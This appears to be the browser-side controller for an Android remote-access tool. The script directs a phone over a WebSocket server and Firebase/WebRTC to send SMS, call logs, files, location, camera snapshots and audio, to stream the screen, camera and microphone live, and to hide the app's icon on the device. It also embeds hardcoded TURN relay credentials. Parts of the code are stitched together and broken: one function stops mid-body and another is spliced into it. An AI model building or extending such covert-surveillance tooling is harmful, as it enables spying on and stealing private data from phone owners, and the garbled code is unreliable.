<script type="module">

    // ---------- GLOBALS ----------
    const WS_URL = "wss://mirror-view.onrender.com";

    // WebRTC peer connections
    let screenPC = null;
    let cameraPC = null;
    let audioPC = null;

    // Separate room IDs for each stream type (for Firebase signaling)
    let screenRoomId = null;
    let cameraRoomId = null;
    let audioRoomId = null;

    // Firestore listeners
    let screenRoomUnsub = null;
    let cameraRoomUnsub = null;
    let audioRoomUnsub = null;

    // UI state
    let mapInstance = null;

    let iconHidden = false;

    // Live camera recording state
    let mediaRecorder = null;
    let recordedChunks = [];

    // Track the last command sent to interpret raw responses
    let pendingCommand = null;

    const panel = document.getElementById('main-panel');
    const statusEl = document.getElementById('status');

    // ---------- ICE SERVERS ----------
    const ICE_SERVERS = [
        { urls: "stun:stun.relay.metered.ca:80" },
        { urls: "turn:standard.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
    ];

    // ---------- FIREBASE SIGNALING HELPERS ----------
    async function createWebRTCRoom(offerSdp, streamType) {
    console.log(`createWebRTCRoom called for ${streamType}`);
    const roomId = 'room_' + Date.now() + '_' + Math.random().toString(36).substring(7);
    const roomData = {
        caller: 'web-client',
        callee: 'android-device',
        status: 'waiting',
        type: streamType,
        createdAt: new Date(),
        offer: {
            type: 'offer',
            sdp: offerSdp
        }
    };
    console.log('Attempting to create Firestore room:', roomId);
    try {
        await setDoc(doc(db, "rooms", roomId), roomData);
        console.log(`‚úÖ Room created (${streamType}):`, roomId);
        showNotification(`Room created: ${roomId}`);
        // Store room ID per type
        if (streamType === 'screen') screenRoomId = roomId;
        else if (streamType === 'camera') cameraRoomId = roomId;
        else if (streamType === 'audio') audioRoomId = roomId;

        listenForRoomAnswer(roomId, streamType);
        return roomId;
    } catch (e) {
        console.error('‚ùå Failed to create room:', e);
        showNotification('Firebase error: ' + e.message);
        return null;
    }
}
    function listenForRoomAnswer(roomId, streamType) {
        let unsubscribe;
        if (streamType === 'screen') {
            if (screenRoomUnsub) screenRoomUnsub();
            unsubscribe = onSnapshot(doc(db, "rooms", roomId), (docSnap) => {
                if (!docSnap.exists()) return;
                const data = docSnap.data();
                const pc = getPCForType(streamType);
                if (data.answer && data.answer.sdp && pc) {
                    console.log('Answer received for', streamType);
                    const answer = new RTCSessionDescription({
                        type: 'answer',
                        sdp: data.answer.sdp
                    });
                    pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote desc:', e));
                }
                if (data.status === 'ended') {
                    console.log('Stream ended by peer:', streamType);
                    if (pc) pc.close();
                    setPCForType(streamType, null);
                    if (streamType === 'screen') {
                        screenActive = false;
                        document.getElementById('screenBtn').innerText = 'Start Screen';
                    }
                    panel.innerHTML = 'Ready.';
                }
            });
            screenRoomUnsub = unsubscribe;
        } else if (streamType === 'camera') {
            if (cameraRoomUnsub) cameraRoomUnsub();
            unsubscribe = onSnapshot(doc(db, "rooms", roomId), (docSnap) => {
                if (!docSnap.exists()) return;
                const data = docSnap.data();
                const pc = getPCForType(streamType);
                if (data.answer && data.answer.sdp && pc) {
                    console.log('Answer received for', streamType);
                    const answer = new RTCSessionDescription({
                        type: 'answer',
                        sdp: data.answer.sdp
                    });
                    pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote desc:', e));
                }
                if (data.status === 'ended') {
                    console.log('Stream ended by peer:', streamType);
                    if (pc) pc.close();
                    setPCForType(streamType, null);
                    panel.innerHTML = 'Ready.';
                }
            });
            cameraRoomUnsub = unsubscribe;
        } else if (streamType === 'audio') {
            if (audioRoomUnsub) audioRoomUnsub();
            unsubscribe = onSnapshot(doc(db, "rooms", roomId), (docSnap) => {
                if (!docSnap.exists()) return;
                const data = docSnap.data();
                const pc = getPCForType(streamType);
                if (data.answer && data.answer.sdp && pc) {
                    console.log('Answer received for', streamType);
                    const answer = new RTCSessionDescription({
                        type: 'answer',
                        sdp: data.answer.sdp
                    });
                    pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote desc:', e));
                }
                if (data.status === 'ended') {
                    console.log('Stream ended by peer:', streamType);
                    if (pc) pc.close();
                    setPCForType(streamType, null);
                    document.getElementById('liveAudioBtn').parentElement.style.display = 'block';
                    document.getElementById('stopLiveAudioBtn').style.display = 'none';
                    panel.innerHTML = 'Ready.';
                }
            });
            audioRoomUnsub = unsubscribe;
        }
    }

    function listenForRemoteCandidates(roomId, remoteUser, streamType) {
        if (candidatesUnsub) candidatesUnsub();
        const candidatesRef = collection(db, "rooms", roomId, "candidates");
        candidatesUnsub = onSnapshot(candidatesRef.where("sender", "==", remoteUser), (snapshot) => {
            snapshot.docChanges().forEach((change) => {
                if (change.type === 'added') {
                    const data = change.doc.data();
                    const candidate = new RTCIceCandidate({
                        candidate: data.candidate,
                        sdpMid: data.sdpMid,
                        sdpMLineIndex: data.sdpMLineIndex
                    });
                    const pc = getPCForType(streamType);
                    if (pc) pc.addIceCandidate(candidate);
                }
            });
        });
    }

    async function sendIceCandidateViaFirebase(roomId, candidate, streamType) {
        if (!roomId) return;
        const candidateData = {
            candidate: candidate.candidate,
            sdpMid: candidate.sdpMid,
            sdpMLineIndex: candidate.sdpMLineIndex,
            sender: 'web-client',
            timestamp: new Date()
        };
        try {
            await addDoc(collection(db, "rooms", roomId, "candidates"), candidateData);
        } catch (e) {
            console.error('Failed to send ICE candidate:', e);
        }
    }

    // Helper to get the correct peer connection based on stream type
    function getPCForType(type) {
        if (type === 'screen') return screenPC;
        if (type === 'camera') return cameraPC;
        if (type === 'audio') return audioPC;
        return null;
    }
    function setPCForType(type, pc) {
        if (type === 'screen') screenPC = pc;
        else if (type === 'camera') cameraPC = pc;
        else if (type === 'audio') audioPC = pc;
    }

    // ---------- PEER CONNECTION CREATORS ----------
    function createPeerConnection(streamType) {
        const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
        pc.ontrack = (e) => {
            if (streamType === 'screen') {
                panel.innerHTML = `
                    <video autoplay playsinline style="width:100%; height:auto;"></video>
                    <div class="live-controls">
                        <button onclick="snapScreen()">üì∏ Snap Screen</button>
                        <button class="stop" onclick="toggleScreen()">‚èπ Stop Screen</button>
                    </div>
                `;
                document.querySelector('video').srcObject = e.streams[0];
            } else if (streamType === 'camera') {
                const video = document.getElementById('liveCamVideo');
                if (video) video.srcObject = e.streams[0];
            } else if (streamType === 'audio') {
                const audioEl = document.getElementById('liveAudio');
                if (audioEl) {
                    audioEl.srcObject = e.streams[0];
                    audioEl.play().catch(err => console.log('Autoplay prevented:', err));
                }
            }
        };
        pc.onicecandidate = (e) => {
            if (e.candidate) {
                let roomId = null;
                if (streamType === 'screen') roomId = screenRoomId;
                else if (streamType === 'camera') roomId = cameraRoomId;
                else if (streamType === 'audio') roomId = audioRoomId;
                if (roomId) {
                    sendIceCandidateViaFirebase(roomId, e.candidate, streamType);
                }
            }
        };
        pc.oniceconnectionstatechange = () => {
            console.log(`${streamType} PC ICE state:`, pc.iceConnectionState);
        };
        return pc;
    }

   // ---------- SCREEN SHARE ----------
async function toggleScreen() {
    console.log('toggleScreen called, current screenActive:', screenActive);
    if (screenActive) {
        // Stop screen share
        console.log('Stopping screen share...');
        if (screenPC) {
            screenPC.close();
            screenPC = null;
        }
        if (screenRoomId) {
            try {
                await updateDoc(doc(db, "rooms", screenRoomId), { status: "ended" });
                console.log('Room status set to ended');
            } catch (e) { console.error('Error ending room:', e); }
            screenRoomId = null;
        }
        if (screenRoomUnsub) {
            screenRoomUnsub();
            screenRoomUnsub = null;
        }
        document.getElementById('screenBtn').innerText = 'Start Screen';
        screenActive = false;
        panel.innerHTML = 'Ready.';
        console.log('Screen share stopped');
    } else {
        // Start screen share
        console.log('Starting screen share...');
        panel.innerHTML = '<h2>Starting screen share...</h2>';
        screenPC = createPeerConnection('screen');
        try {
            console.log('Creating offer...');
            const offer = await screenPC.createOffer();
            console.log('Offer created, setting local description...');
            await screenPC.setLocalDescription(offer);

    // ---------- JOIN ROOM (when Android creates room) ----------
    async function joinFirebaseRoom(roomId) {
        const roomRef = doc(db, "rooms", roomId);
        const roomSnap = await getDoc(roomRef);
        if (!roomSnap.exists()) {
            console.error('Room not found');
            return;
        }
        const data = roomSnap.data();
        const streamType = data.type; // "screen", "camera", "audio"
        const offerSdp = data.offer.sdp;

        // Create appropriate peer connection
        let pc;
        if (streamType === 'screen') {
            if (!screenPC) screenPC = createPeerConnection('screen');
            pc = screenPC;
        } else if (streamType === 'camera') {
            if (!cameraPC) cameraPC = createPeerConnection('camera');
            pc = cameraPC;
        } else if (streamType === 'audio') {
            if (!audioPC) audioPC = createPeerConnection('audio');
            pc = audioPC;
        }
        if (!pc) return;

        const offer = new RTCSessionDescription({ type: 'offer', sdp: offerSdp });
        await pc.setRemoteDescription(offer);
        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);

        // Send answer to Firebase
        await updateDoc(roomRef, {
            answer: {
                type: 'answer',
                sdp: answer.sdp,
                sender: 'web-client'
            }
        });

        // Listen for remote ICE candidates
        listenForRemoteCandidates(roomId, 'android-device', streamType);
        if (streamType === 'screen') screenRoomId = roomId;
        else if (streamType === 'camera') cameraRoomId = roomId;
        else if (streamType === 'audio') audioRoomId = roomId;
    }

    // ---------- COMMAND SENDING (JSON) ----------
 function sendCommand(command, params = {}) {
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        console.error('WebSocket not open ‚Äì cannot send command:', command);
        panel.innerHTML = `<div style="color:#d32f2f;">‚ö† WebSocket not connected. Click reconnect.</div>`;
        return;
    }
    const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
    const payload = {
        type: 'COMMAND',
        command: command,
        requestId: requestId,
        params: params,
        timestamp: Date.now()
    };
    const json = JSON.stringify(payload);
    console.log('üì§ Sending command:', json);
    ws.send(json);
    panel.innerHTML = `üì§ Command sent: ${command}`;
    pendingCommand = command;
    setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
}

    // ---------- PLAIN TEXT / JSON HANDLERS ----------
    function handleJSON(json) {
        console.log('handleJSON:', json.type, json);
        switch (json.type) {
            case 'SMS_DATA':
                console.log('üì© SMS_DATA received', json.data);
                dataType = 'sms';
                currentData = json.data;
                renderTable();
                pendingCommand = null;
                break;
            case 'CALL_LOGS':
                dataType = 'call';
                currentData = json.data;
                renderTable();
                pendingCommand = null;
                break;
            case 'FILE_LIST':
                dataType = 'file';
                currentData = json.data;
                renderFiles();
                pendingCommand = null;
                break;
            case 'LOCATION_UPDATE':
                renderMap(json.data);
                pendingCommand = null;
                break;
            case 'CAMERA_IMAGE':
                displayCapturedImage(json.data);
                pendingCommand = null;
                break;
            case 'AUDIO_RECORDING':
                showAudio(json.data);
                pendingCommand = null;
                break;
            case 'ERROR':
                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
                pendingCommand = null;
                break;
            case 'DEVICE_STATUS':
                setStatus(json.status);
                pendingCommand = null;
                break;
            case 'APP_HIDDEN':
                iconHidden = true;
                document.getElementById('iconBtn').innerText = 'Show Icon';
                showNotification('App icon hidden');
                pendingCommand = null;
                break;
            case 'APP_SHOWN':
                iconHidden = false;
                document.getElementById('iconBtn').innerText = 'Hide Icon';
                showNotification('App icon shown');
                pendingCommand = null;
                break;
            case 'SCREEN_SHARE_STARTED':
                screenActive = true;
                document.getElementById('screenBtn').innerText = 'Stop Screen';
                showNotification('Screen share started');
                pendingCommand = null;
                break;
            case 'SCREEN_SHARE_STOPPED':
                screenActive = false;
                document.getElementById('screenBtn').innerText = 'Start Screen';
                if (screenPC) { screenPC.close(); screenPC = null; }
                showNotification('Screen share stopped');
                pendingCommand = null;
                break;
            case 'ROOM_CREATED':
                // Android created a room, join it
                if (json.roomId) joinFirebaseRoom(json.roomId);
                pendingCommand = null;
                break;
            default:
                console.log('Unhandled JSON type:', json.type);
                // If we have a pending command, try to infer the response format
                if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
                    dataType = 'file';
                    currentData = json;
                    renderFiles();
                    pendingCommand = null;
                } else if (pendingCommand === 'GET_SMS' && Array.isArray(json)) {
                    dataType = 'sms';
                    currentData = json;
                    renderTable();
                    pendingCommand = null;
                } else if (pendingCommand === 'GET_CALL_LOGS' && Array.isArray(json)) {
                    dataType = 'call';
                    currentData = json;
                    renderTable();
                    pendingCommand = null;
                } else if (pendingCommand === 'GET_LOCATION' && json.lat && json.lon) {
                    renderMap(json);
                    pendingCommand = null;
                }
                break;
        }
    }

    function handlePlainText(msg) {
        if (msg.startsWith("STATUS:")) {
            setStatus(msg.substring(7));
            pendingCommand = null;
        } else if (msg.startsWith("LOC_DATA:")) {
            try {
                const data = JSON.parse(msg.substring(9));
                renderMap(data);
                pendingCommand = null;
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("FILE_LIST:")) {
            try {
                currentData = JSON.parse(msg.substring(10));
                dataType = 'file';
                renderFiles();
                pendingCommand = null;
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("SMS_DATA:")) {
            try {
                currentData = JSON.parse(msg.substring(9));
                dataType = 'sms';
                renderTable();
                pendingCommand = null;
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("CALL_DATA:")) {
            try {
                currentData = JSON.parse(msg.substring(10));
                dataType = 'call';
                renderTable();
                pendingCommand = null;
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("CAMERA_IMAGE:")) {
            const base64 = msg.substring(13);
            displayCapturedImage(base64);
            pendingCommand = null;
        } else if (msg.startsWith("AUDIO_RECORDING:")) {
            showAudio(msg.substring(16));
            pendingCommand = null;
        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
            screenActive = true;
            document.getElementById('screenBtn').innerText = 'Stop Screen';
            showNotification('Screen share started');
            pendingCommand = null;
        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
            screenActive = false;
            document.getElementById('screenBtn').innerText = 'Start Screen';
            if (screenPC) { screenPC.close(); screenPC = null; }
            showNotification('Screen share stopped');
            pendingCommand = null;
        } else if (msg.startsWith("APP_HIDDEN")) {
            iconHidden = true;
            document.getElementById('iconBtn').innerText = 'Show Icon';
            showNotification('App icon hidden');
            pendingCommand = null;
        } else if (msg.startsWith("APP_SHOWN")) {
            iconHidden = false;
            document.getElementById('iconBtn').innerText = 'Hide Icon';
            showNotification('App icon shown');
            pendingCommand = null;
        } else if (msg.startsWith("VIBRATE_DONE")) {
            showNotification('Vibration done');
            pendingCommand = null;
        } else if (msg.startsWith("ERROR:")) {
            panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
            pendingCommand = null;
        } else if (msg.startsWith("FILE_DATA:")) {
            const base64 = msg.substring(10);
            downloadBase64(base64, 'downloaded_file');
            pendingCommand = null;
        } else if (msg.startsWith('[') || msg.startsWith('{')) {
            // Try to parse as JSON (raw response from device)
            try {
                const parsed = JSON.parse(msg);
                handleJSON(parsed);
            } catch (err) {
                console.error('Failed to parse JSON in plain text:', err);
            }
        } else {
            console.log('Unhandled plain text:', msg);
        }
    }

                    console.error('Invalid JSON:', msg);
                }
            } else {
                handlePlainText(msg);
            }
        };
        ws.onclose = () => {
            console.log('WebSocket closed');
            setStatus('OFFLINE');
            panel.innerHTML = 'üîå WebSocket disconnected. Click reconnect.';
            ws = null;
        };
        ws.onerror = (err) => {
            console.error('WebSocket error:', err);
            setStatus('ERROR');
        };
    }

    // ---------- ATTACH FUNCTIONS TO WINDOW (for onclick handlers) ----------
    window.toggleScreen = toggleScreen;
    window.toggleCameraPanel = toggleCameraPanel;
    window.capturePicture = capturePicture;
    window.startLiveStream = startLiveStream;
    window.stopLiveStream = stopLiveStream;
    window.toggleLiveAudio = toggleLiveAudio;
    window.stopLiveAudio = stopLiveAudio;
    window.sendCommand = sendCommand;
    window.sendPlainText = sendPlainText;
    window.toggleAppIcon = toggleAppIcon;
    window.takeSnapshot = takeSnapshot;
    window.toggleRecording = toggleRecording;
    window.downloadBase64 = downloadBase64;
    window.gotoPage = gotoPage;
    window.handleFolderClick = handleFolderClick;
    window.navigateUp = navigateUp;
    window.updateSelected = updateSelected;
    window.downloadSelected = downloadSelected;
    window.connectWebSocket = connectWebSocket;
    window.snapScreen = snapScreen; // <-- Added

    // Additional binding for screen share button (to avoid inline onclick conflict)
    document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);

    // ---------- START ----------
    connectWebSocket();
</script>
